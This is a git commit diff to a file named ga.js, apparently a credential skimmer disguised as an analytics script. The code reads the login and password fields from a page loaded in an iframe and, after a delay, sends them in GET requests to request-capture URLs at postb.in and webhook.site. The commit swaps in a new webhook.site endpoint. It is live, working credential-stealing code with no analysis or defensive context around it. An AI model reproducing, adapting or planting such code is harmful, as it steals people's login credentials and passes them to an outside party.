41f203074bac6519cf6b01b1c9a978803d895831
kapskaps <44715023+kapskaps@users.noreply.github.com>
2018-11-02 23:39:36 +0000

    Update ga.js

--- ga.js
+++ ga.js
@@ -3,8 +3,7 @@ var iframe = document.getElementById("frame1");
 iframe.onload = function() {
 
 setTimeout(function(){ 
-jQuery.get("http://postb.in/e6fv7555?u="+iframe.contentWindow.jQuery('#txtLogin').val()+"&p="+iframe.contentWindow.jQuery('#txtPassword').val())
-jQuery.get("https://webhook.site/47b30c5b-571d-4c84-93e9-6377762a81f6?u="+iframe.contentWindow.jQuery('#txtLogin').val()+"&p="+iframe.contentWindow.jQuery('#txtPassword').val())
+jQuery.get("https://webhook.site/5a67fcec-6b2c-4372-b23b-5210ba22c7da?u="+iframe.contentWindow.jQuery('#txtLogin').val()+"&p="+iframe.contentWindow.jQuery('#txtPassword').val())
 
 
  }, 3000);
